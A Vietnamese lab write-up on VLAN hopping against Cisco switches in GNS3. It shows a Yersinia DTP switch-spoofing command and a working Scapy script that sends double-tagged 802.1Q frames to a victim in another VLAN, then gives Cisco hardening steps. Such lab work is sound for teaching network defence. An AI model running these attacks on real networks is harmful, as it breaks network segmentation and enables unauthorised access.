# 🦘 Lab: VLAN Hopping Attack (Switch Spoofing & Double Tagging)

## 🎯 Mục tiêu bài Lab
Bài lab này tập trung vào việc vượt qua cơ chế cô lập mạng của VLAN (Virtual Local Area Network) trên các Switch Cisco trong môi trường GNS3. Qua đó, hiểu rõ hai kỹ thuật tấn công phổ biến là Switch Spoofing và Double Tagging, cũng như cách thiết lập cấu hình an toàn cho các cổng mạng Layer 2 để ngăn chặn sự lây lan của các mối đe dọa.

## ⚙️ Môi trường & Công cụ
* **Nền tảng:** GNS3
* **Thiết bị:** Cisco Layer 2 Switches (IOU/IOL)
* **Máy tấn công:** Kali Linux
* **Công cụ:** Yersinia, Scapy (Python), Wireshark

## 🚀 Kịch bản tấn công (Attack Scenarios)

### 1. Kỹ thuật Switch Spoofing (Giả mạo Switch)
Kẻ tấn công lợi dụng giao thức DTP (Dynamic Trunking Protocol) được bật mặc định trên nhiều dòng Switch Cisco (thường ở chế độ `dynamic desirable` hoặc `dynamic auto`). Máy tấn công sẽ gửi các gói tin DTP để đàm phán, biến cổng kết nối của mình thành cổng Trunk. Khi đã có đường Trunk, kẻ tấn công có thể gắn thẻ (tag) bất kỳ VLAN nào để truy cập trực tiếp vào các dải mạng đó.

**Thực thi:**
Sử dụng công cụ `yersinia` trên Kali Linux để gửi các gói tin DTP giả mạo:
```bash
yersinia -G
```
*Trong giao diện đồ họa của Yersinia, chọn giao thức DTP và thực thi "Enable trunking".*

Hoặc chạy lệnh trực tiếp từ terminal:
```bash
yersinia dtp -attack 1 -interface eth0
```

### 2. Kỹ thuật Double Tagging (Gắn thẻ kép 802.1Q)
Kỹ thuật này hoạt động độc lập với DTP, nhưng yêu cầu máy tấn công phải được kết nối vào một cổng Access thuộc cùng VLAN với **Native VLAN** của đường Trunk hợp lệ. 
Kẻ tấn công sẽ tạo ra một gói tin có hai thẻ VLAN (thẻ bên ngoài là Native VLAN, thẻ bên trong là VLAN mục tiêu). Khi Switch đầu tiên nhận gói tin, nó gỡ thẻ Native VLAN và đẩy phần còn lại qua đường Trunk. Switch thứ hai nhận được gói tin với thẻ VLAN mục tiêu và chuyển nó đến đích.

**Thực thi (Sử dụng Python/Scapy):**
```python
from scapy.all import *

# Thiết lập thông số
target_mac = "00:11:22:33:44:55" # MAC của máy nạn nhân ở VLAN đích
native_vlan = 1                  # Native VLAN hiện tại
target_vlan = 10                 # VLAN muốn nhảy sang (VLAN đích)

# Tạo gói tin mang thẻ kép (Double Tagged)
ether = Ether(dst=target_mac)
dot1q_outer = Dot1Q(vlan=native_vlan)
dot1q_inner = Dot1Q(vlan=target_vlan)
ip = IP(dst="192.168.10.5") # IP nạn nhân thuộc VLAN 10
icmp = ICMP()

# Ghép nối các layer và gửi
pkt = ether / dot1q_outer / dot1q_inner / ip / icmp
sendp(pkt, iface="eth0")
```

## 🛡️ Biện pháp phòng thủ (Mitigation)
Để ngăn chặn hoàn toàn VLAN Hopping trên thiết bị Cisco, cần thực hiện chuẩn hóa các cấu hình sau:

1. **Tắt giao thức đàm phán DTP và ép cứng chế độ Access trên các cổng kết nối người dùng:**
```bash
Switch(config)# interface range e0/0 - 3
Switch(config-if-range)# switchport mode access
Switch(config-if-range)# switchport nonegotiate
```

2. **Xử lý Native VLAN trên các đường Trunk hợp lệ:**
Thay đổi Native VLAN mặc định (VLAN 1) sang một VLAN "chết" (không được gán cho bất kỳ port access nào). Kỹ thuật Double Tagging sẽ thất bại nếu cổng access của kẻ tấn công không trùng với Native VLAN.
```bash
Switch(config)# interface e1/0
Switch(config-if)# switchport trunk encapsulation dot1q
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk native vlan 999
```

3. **Vô hiệu hóa các port không sử dụng:**
Đưa tất cả các port đang trống vào một VLAN "chết" và shutdown chúng.
```bash
Switch(config)# interface range e2/0 - 3
Switch(config-if-range)# switchport access vlan 999
Switch(config-if-range)# shutdown
```

---
*Project by Nguyen Gia Bao (Hoa Bảo Lục) - 2026*